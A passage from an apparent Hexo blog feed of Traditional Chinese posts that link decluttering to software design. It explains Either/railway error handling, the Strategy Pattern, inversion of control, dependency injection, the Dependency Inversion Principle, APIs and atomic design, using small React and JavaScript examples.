技巧來處理錯誤流，在這種模型中，資料流就像在鐵路軌道上運行的火車一樣，可以選擇不同的方向 <code>左</code> 或<code>右</code> 軌道，具體取決於處理成功 (right) 或失敗 (left)。</p><p>Functional Programming 中的 Either 就是一個包著正確值或是錯誤的盒子，以下是一個簡單的 Railway Programming 使用 Either 來表示成功和失敗的情況，檢查年齡是否為成年，然後執行一個操作。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Either</span> = &#123;</span><br><span class="line">  <span class="attr">left</span>: <span class="function">(<span class="params">value</span>) =&gt;</span> (&#123;</span><br><span class="line">    <span class="attr">isLeft</span>: <span class="literal">true</span>,</span><br><span class="line">    value,</span><br><span class="line">  &#125;),</span><br><span class="line"></span><br><span class="line">  <span class="attr">right</span>: <span class="function">(<span class="params">value</span>) =&gt;</span> (&#123;</span><br><span class="line">    <span class="attr">isLeft</span>: <span class="literal">false</span>,</span><br><span class="line">    value,</span><br><span class="line">  &#125;),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isInvalidAge</span> = (<span class="params">age</span>) =&gt; <span class="built_in">isNaN</span>(age) || age &lt; <span class="number">0</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isChild</span> = (<span class="params">age</span>) =&gt; age &lt; <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkAge</span>(<span class="params">age</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">isInvalidAge</span>(age)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Either</span>.<span class="title function_">left</span>(<span class="string">&quot;年齡不能為負數&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">isChild</span>(age)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Either</span>.<span class="title function_">left</span>(<span class="string">&quot;未成年&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Either</span>.<span class="title function_">right</span>(<span class="string">&quot;成年&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">processAge</span>(<span class="params">age</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">checkAge</span>(age).<span class="property">isLeft</span></span><br><span class="line">    ? <span class="string">`錯誤：<span class="subst">$&#123;checkAge(age).value&#125;</span>`</span></span><br><span class="line">    : <span class="string">`結果：<span class="subst">$&#123;checkAge(age).value&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">processAge</span>(<span class="number">25</span>)); <span class="comment">// 結果：成年</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">processAge</span>(<span class="number">15</span>)); <span class="comment">// 結果：未成年</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">processAge</span>(<span class="string">&quot;abc&quot;</span>)); <span class="comment">// 錯誤：年齡無效</span></span><br></pre></td></tr></table></figure><h2 id="Strategy-Pattern"><a href="#Strategy-Pattern" class="headerlink" title="Strategy Pattern"></a>Strategy Pattern</h2><p>策略模式用於在元件間共享行為和邏輯，目的是將可互換的行為封裝成獨立的策略物件，在運行時動態選擇適當的策略來執行特定的任務。</p><p>可以幫助實現元件的</p><ul><li>去耦合</li><li>可重用性</li><li>可擴展性</li></ul><p>在 React 中，策略模式可以應用於元件的行為和邏輯。</p><ol><li>策略元件: StrategyA 和 StrategyB，這兩個元件分別實現了不同的行為<ul><li>策略是 ‘A’ -&gt; 渲染 StrategyA</li><li>策略是 ‘B’ -&gt; 渲染 StrategyB</li></ul></li><li>ContextComponent 是上下文元件，根據傳遞的策略選擇渲染相應的策略元件</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 策略元件</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">StrategyA</span> = (<span class="params">&#123; data &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 策略 A 的實現</span></span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Strategy A: &#123;data&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">StrategyB</span> = (<span class="params">&#123; data &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 策略 B 的實現</span></span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Strategy B: &#123;data&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上下文元件</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">ContextComponent</span> = (<span class="params">&#123; strategy, data &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 根據選擇的策略渲染對應的元件</span></span><br><span class="line">  <span class="keyword">if</span> (strategy === <span class="string">&quot;A&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">StrategyA</span> <span class="attr">data</span>=<span class="string">&#123;data&#125;</span> /&gt;</span></span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (strategy === <span class="string">&quot;B&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">StrategyB</span> <span class="attr">data</span>=<span class="string">&#123;data&#125;</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">App</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> strategy = <span class="string">&quot;A&quot;</span>; <span class="comment">// 選擇策略 A 或 B</span></span><br><span class="line">  <span class="keyword">const</span> data = <span class="string">&quot;Hello, Strategy Pattern!&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">ContextComponent</span> <span class="attr">strategy</span>=<span class="string">&#123;strategy&#125;</span> <span class="attr">data</span>=<span class="string">&#123;data&#125;</span> /&gt;</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以剛剛年齡的例子來說</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 策略 A：確保年齡為正數</span></span><br><span class="line"><span class="comment">// 策略 B：確保年齡成年</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">AgeVerificationStrategies</span> = &#123;</span><br><span class="line">  <span class="attr">adult</span>: <span class="function">(<span class="params">age</span>) =&gt;</span> age &gt;= <span class="number">18</span>,</span><br><span class="line">  <span class="attr">positive</span>: <span class="function">(<span class="params">age</span>) =&gt;</span> age &gt;= <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">ContextComponent</span> = (<span class="params">&#123; strategy, age &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> verifyAge = <span class="title class_">AgeVerificationStrategies</span>[strategy];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">verifyAge</span>(age)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>年齡驗證通過：&#123;age&#125; 歲<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>年齡驗證失敗：&#123;age&#125; 歲<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">App</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> strategy = <span class="string">&quot;adult&quot;</span>; <span class="comment">// 選擇策略 adult 或 positive</span></span><br><span class="line">  <span class="keyword">const</span> age = <span class="number">25</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">ContextComponent</span> <span class="attr">strategy</span>=<span class="string">&#123;strategy&#125;</span> <span class="attr">age</span>=<span class="string">&#123;age&#125;</span> /&gt;</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="Inversion-of-Control"><a href="#Inversion-of-Control" class="headerlink" title="Inversion of Control"></a>Inversion of Control</h2><p>控制反轉是一個常見改變程式結構和元件相互互動方式的一種方式，提倡將控制權交給框架或容器，將控制權交給使用的人。</p><blockquote><p>面板加上輸出端子會變成螢幕，加了上網功能搭配<code>遙控器</code>後就成為上網電視</p></blockquote><p>遙控器就是控制反轉的一個概念，我們不直接操作上網電視而是透過遙控器，不管是實體遙控器或著是手機 APP 都可以達到一樣的目的，電視的操作流程不被預先定義，而是當使用者使用時才用遙控器去進行各種不同的操作流程。</p><p>底下舉兩個簡單的例子，透過把 <code>normalize</code> 的控制權放到 props 就能夠動態的去改動 input 文字大小寫。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Input</span> = (<span class="params">&#123; normalize &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [value, setValue] = <span class="title function_">useState</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">value</span>=<span class="string">&#123;text&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">onChange</span>=<span class="string">&#123;(&#123;</span> <span class="attr">target</span> &#125;) =&gt;</span> setValue(normalize(target.value))&#125;</span></span><br><span class="line"><span class="language-xml">    /&gt;</span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">Input</span> <span class="attr">normalize</span>=<span class="string">&#123;(text)</span> =&gt;</span> text.toUpperCase()&#125; /&gt;</span>;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">Input</span> <span class="attr">normalize</span>=<span class="string">&#123;(text)</span> =&gt;</span> text.toLowerCase()&#125; /&gt;</span>;</span><br></pre></td></tr></table></figure><p>把剛剛的例子加上年齡限制</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Input</span> = (<span class="params">&#123; onInputChange, isAgeValid &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [value, setValue] = <span class="title function_">useState</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> [isValid, setIsValid] = <span class="title function_">useState</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">handleInputChange</span> = (<span class="params">&#123; target &#125;</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> inputValue = target.<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">const</span> normalizedValue = <span class="title function_">onInputChange</span>(inputValue);</span><br><span class="line">    <span class="title function_">setValue</span>(normalizedValue);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 檢查年齡限制</span></span><br><span class="line">    <span class="keyword">const</span> age = <span class="built_in">parseInt</span>(normalizedValue, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">const</span> isValidAge = <span class="title function_">isAgeValid</span>(age);</span><br><span class="line">    <span class="title function_">setIsValid</span>(isValidAge);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">value</span>=<span class="string">&#123;value&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">onChange</span>=<span class="string">&#123;handleInputChange&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">borderColor:</span> <span class="attr">isValid</span> ? &quot;<span class="attr">green</span>&quot; <span class="attr">:</span> &quot;<span class="attr">red</span>&quot; &#125;&#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      /&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;!isValid &amp;&amp; <span class="tag">&lt;<span class="name">p</span>&gt;</span>年齡必須在 18 到 100 歲之間<span class="tag">&lt;/<span class="name">p</span>&gt;</span>&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">App</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">toUpperCaseNormalize</span> = (<span class="params">text</span>) =&gt; text.<span class="title function_">toUpperCase</span>();</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">isAgeValid</span> = (<span class="params">age</span>) =&gt; age &gt;= <span class="number">18</span> &amp;&amp; age &lt;= <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Input</span> <span class="attr">onInputChange</span>=<span class="string">&#123;toUpperCaseNormalize&#125;</span> <span class="attr">isAgeValid</span>=<span class="string">&#123;isAgeValid&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Dependency-Injection"><a href="#Dependency-Injection" class="headerlink" title="Dependency Injection"></a>Dependency Injection</h3><p>實現 IoC 有多種方式，通常與依賴注入（DI）密切相關。</p><p>元件或物件都是從外部提供其依賴的功能或服務而不是在內部建立它們。</p><p>以剛剛那個例子來說</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">isAgeValid</span> = (<span class="params">age</span>) =&gt; age &gt;= <span class="number">18</span> &amp;&amp; age &lt;= <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">Input</span> <span class="attr">onInputChange</span>=<span class="string">&#123;toUpperCaseNormalize&#125;</span> <span class="attr">isAgeValid</span>=<span class="string">&#123;isAgeValid&#125;</span> /&gt;</span></span>;</span><br></pre></td></tr></table></figure><p><code>isAgeValid</code> 就被注入到 <code>Input</code> 元件中，這樣即使驗證年齡的法規變了也可以輕易的改動，而不影響程式的核心的輸入邏輯。</p><h2 id="好萊塢法則"><a href="#好萊塢法則" class="headerlink" title="好萊塢法則"></a>好萊塢法則</h2><blockquote><p>不要給我們打電話，我們會給你打電話 (don’t call us, we’ll call you)<br>好萊塢法則</p></blockquote><p>好萊塢法則的一個主要概念是提供了時間和使用上的彈性，不先預設定義好所有情境，而是當需要用到的時候，由使用的人再定義並給予規則或回應方式。</p>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>當依賴反轉就不再依賴</title>
      <link href="/2023/09/30/simplify-your-life/dependency-inversion-principle/"/>
      <url>/2023/09/30/simplify-your-life/dependency-inversion-principle/</url>
      
        <content type="html"><![CDATA[<p>在開始之前先來首歌吧，覺得熟悉的話，你就爆露年紀了 &gt;.^</p><iframe width="560" height="215" src="https://www.youtube.com/embed/mTgS7R-v-lI?si=4GJqfcShudtdHOm0&amp;controls=0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><p>來談談物品的管理，生而為人我們的目的是使用物品而不是被物品牽制而影響。</p><p>當你不去整理身邊的物品，那生活最終就會不得不依賴物品的變化進而被影響原本的生活。</p><ul><li>當我們的衣服、鞋子越買越多，受限於空間我們只能不停的堆放，甚至有些會被放在深處不再拿出，接下來找尋特定衣物就會漸漸變得困難</li><li>當今天工作相關紙本堆積如山，包括文件、發票、收據，如果沒有依照需求進行分類整理和規範，最終就會難以保持整齊的工作環境</li></ul><p>在生活上依賴於物品的安排和存放方式，而不是將物品的安排和存放方式適應生活需求，這種方式通常會導致物品難以找到、使用不方便，甚至造成浪費。</p><p>如果所有事情都放在心上，那根本沒辦法放鬆和休息，那我們可以怎麼辦?</p><blockquote><p>役物，而不役於物，君子寡欲則不役於物，可以直道而行</p></blockquote><p>很多時候並不是時間不夠，而是不了解任務的定義和性質，不了解的情況下當然也沒辦法有良好的規範去遵循。</p><h2 id="Dependency-Inversion-Principle-DIP"><a href="#Dependency-Inversion-Principle-DIP" class="headerlink" title="Dependency Inversion Principle (DIP)"></a>Dependency Inversion Principle (DIP)</h2><p>來舉一個工作上常見的案例，當今天你越來越資深的時候，工作上肯定會遇到底下的情境</p><ul><li>資深工程師 -&gt; 菜鳥工程師弟弟妹妹</li><li>資深工程師 -&gt; 菜鳥實習生弟弟妹妹</li></ul><p>隨著工作上遇到的弟弟妹妹越來越多，你可能會漸漸的忘記弟弟妹妹們的職能、技能和擅長的事物，一不小心也有可能記不起來名字，這時候在合作上就容易出現問題。</p><ul><li>資深工程師 -&gt; 很多弟弟妹妹</li></ul><p>這個時候我們就需要定義一個有相關規範的角色給大家遵守，這時候人與人之間關係就會變成</p><ul><li>資深工程師 -&gt; 菜鳥工程師 &lt;- 弟弟妹妹</li><li>資深工程師 -&gt; 菜鳥實習生 &lt;- 弟弟妹妹</li></ul><p>最大的差異在多定義一層 <code>菜鳥工程師</code> 和 <code>菜鳥實習生</code> 來規範該職能所需的技能和可以完成的工作。</p><p>這樣資深工程師就只需要針對<code>菜鳥工程師</code>、<code>菜鳥實習生</code>做對應的引導，而對弟弟妹妹來說也會明確知道身為菜鳥工程師或是菜鳥實習生該做什麼才會符合那個角色的定義。</p><blockquote><p>當你不小心忘記實習生名字的時候，你就直接叫直接實習生大大就不會叫錯了 (O)</p></blockquote><p>透過依賴的反轉，我們可以不再被牽制，而是真的在讓彼此的生活過得更好。</p><h2 id="Application-Programming-Interface-API"><a href="#Application-Programming-Interface-API" class="headerlink" title="Application Programming Interface (API)"></a>Application Programming Interface (API)</h2><p>當我們今天需要別人提供服務的時候，我們可以直觀的直接請對方幫我們處理</p><ul><li>使用者 -&gt; 服務提供者</li></ul><p>但大家有沒有發現，這樣的關係又會變成剛剛提到的情境，這個時候我們就會需要導入 Application Programming Interface (API) 的概念。</p><p>API 其中有一個重要性就是契約的概念，當這個協議定下來後，就不能改變，其中像是</p><ul><li>功能定義：支援的操作、輸入參數、輸出格式</li><li>授權和認證：透過 API 金鑰、OAuth 令牌來控制訪問權限</li><li>使用限制：包括使用限制，如每分鐘的請求數限制、資料傳輸流量、資料大小</li><li>故障處理和錯誤碼：定義錯誤碼、錯誤消息和建議的解決方法</li><li>版本控制：指明 API 的版本確保使用者知道他們使用的是哪個 API 版本，並且可以預測未來的更改</li></ul><p>當這個契約和規範成立之後</p><ul><li>對於提供 API 的人，就會依照以上的規範進行實作</li><li>對於使用 API 的人，就未依照以上的規範進行使用</li></ul><p>由於 API 的出現，使用者就不再依賴服務提供者，今天只要 API 沒變，服務提供者即使從人類換成機器人也不影響任何結果。</p><ul><li>使用者 -&gt; API &lt;- 服務提供者</li></ul><h2 id="依賴，依賴反轉和斷捨離"><a href="#依賴，依賴反轉和斷捨離" class="headerlink" title="依賴，依賴反轉和斷捨離"></a>依賴，依賴反轉和斷捨離</h2><p>也許真正的富足並不來自於擁有多少物品，而是來自於對生活的滿足和平靜。</p><p>人生真正有價值的只有時間，當我們減少對物品的需求，也許就能有更多的時間和精力來關注更重要的事情，如人際關係、心靈成長和社會參與。</p><p>「依賴反轉」的習慣，也許可以協助我們找到一種平衡，對於那些擁有感到足夠，同時保持心靈的寧靜。</p>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原子化設計 X 收納</title>
      <link href="/2023/09/29/simplify-your-life/modular-storage-solutions/"/>
      <url>/2023/09/29/simplify-your-life/modular-storage-solutions/</url>
      
        <content type="html"><![CDATA[<p>小編前陣子去台中參加 AWS 社群日的時候，順道逛了人生第一次 IKEA，除了丸子很好吃霜淇淋也很不錯的部分，覺得更滿意的是整個賣場的體驗。</p><p>不過今天小編想要來談談的是家具的設計，理工宅的小編在逛家具的過程中其實發現蠻多的家具都有模組化的收納策略。</p><p>什麼是模組化</p><ul><li>可擴展: 消費者可以隨著時間的推移，可以輕易增加模組來增加收納系統的彈性</li><li>可替換: 可以輕易更新壞掉或是不需要的模組，這意味著不同的元件和部分可以結合在一起</li><li>節制和簡約: 不需要一次就買到位，後續可以逐步的擴充</li></ul><p>模組化以收納解決方案為例</p><ol><li>櫃子的格子大小都會是固定的</li><li>櫃子可以選擇放入抽屜或是收納箱</li><li>抽屜跟箱子都針對格子大小去設計不同材質的方案</li></ol><p>透過這三點的巧思，消費者能夠根據需求和可用空間自訂和擴展家具，這樣的策略可以更靈活管理空間同時減少浪費。</p><p>既然<a href="https://linyencheng.github.io/2023/09/28/simplify-your-life/extreme-organization-and-high-scalability/">收納是生活中不可或缺的一部分</a>，那接下來模組化和原子化設計的理念也很重要，接下來我們將開箱原子化設計如何與元件、模組和收納相關，並如何在這些領域中發揮關鍵作用。</p><h2 id="原子化設計-Atomic-Design"><a href="#原子化設計-Atomic-Design" class="headerlink" title="原子化設計 (Atomic Design)"></a>原子化設計 (Atomic Design)</h2><p>原子化設計的概念源於將大型複雜系統分解成更小、更簡單的元素或原子 (元件)，這個原則不僅適用於家具和室內裝潢，還廣泛應用於軟體開發和設計領域。</p><p>那在軟體開發上通常也會將程式碼區分為元件和模組</p><ul><li>元件: 可以獨立存在且具有自己的功能和風格，並有簡單、清晰統一的設計，以便融入不同的模組並與其他元件整合。<ul><li>家居裝飾中: 原子可以是一個燈具、一張椅子、一個置物箱</li><li>軟體設計中: 原子可以是一個按鈕、一個輸入框或一個圖像</li></ul></li><li>模組: 是原子化設計的結合，它們將多個元件組合在一起以創建更大、更有功能性的單位<ul><li>家居裝飾中，模組可以是一個房間的設計，包括家具、燈具和裝飾元素的組合</li><li>軟體開發中，模組可以是一個應用程式的不同部分，每個部分由多個元件組成</li></ul></li></ul><p>原子化設計、元件、模組這些原則和概念有助於創建簡單、實用、有組織的設計，模組的關鍵優勢是可擴展性、可客製化和根據需求建立不同的配置。</p><p>透過這種方法論，我們更能夠去靈活地設計、建立和管理我們的生活和空間，同時確保效能和美觀。</p><h2 id="前端框架的元件和模組化"><a href="#前端框架的元件和模組化" class="headerlink" title="前端框架的元件和模組化"></a>前端框架的元件和模組化</h2><p>前端框架模組化是近代前端開發上的顯學和主要趨勢，有助於提高程式碼的可維護性、重用性和協作性。</p><p>元件化是前端模組化的核心，前端框架御三家目前都強調元件的使用。開發者在開發時都會將應用程式分解為多個小元件，每個元件都有自己的狀態、視圖和邏輯。</p><p>這樣的結構使程式碼更易管理，並能夠實現元件的重用，最後透過 Webpack 等模組打包工具將程式碼拆分為多個模組，在需要的時候才進行載入，提高了應用程式效能。</p><p>除了主要的前端框架，開發者還可以使用各種工具，像是 React Router、Redux、Styled-components 等來擴充程式的功能並提高開發效率。</p><p>總的來說，前端框架模組化目標是應對日益複雜的前端應用需求，提高程式碼的可維護性和可擴展性。</p><h3 id="單檔元件-Single-File-Component"><a href="#單檔元件-Single-File-Component" class="headerlink" title="單檔元件 (Single-File Component)"></a>單檔元件 (Single-File Component)</h3><p>Vue.js 引入了 SFC 的概念，在一個檔案中結合 HTML、CSS 和 JavaScript 程式碼。這樣的設計使元件更自包含，並提高程式碼結構的清晰度。</p><h3 id="Web-元件-Web-Components"><a href="#Web-元件-Web-Components" class="headerlink" title="Web 元件 (Web Components)"></a>Web 元件 (Web Components)</h3><p>Web 元件是一個 W3C 標準，讓開發者建立可重用的自定義 HTML 元素。雖然它仍在逐漸普及中，但它具有改變前端模組化方式的潛力，使元件更容易在不同框架和專案中共享。</p>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有什麼留在你我的心頭，那是什麼？</title>
      <link href="/2023/09/28/simplify-your-life/extreme-organization-and-high-scalability/"/>
      <url>/2023/09/28/simplify-your-life/extreme-organization-and-high-scalability/</url>
      
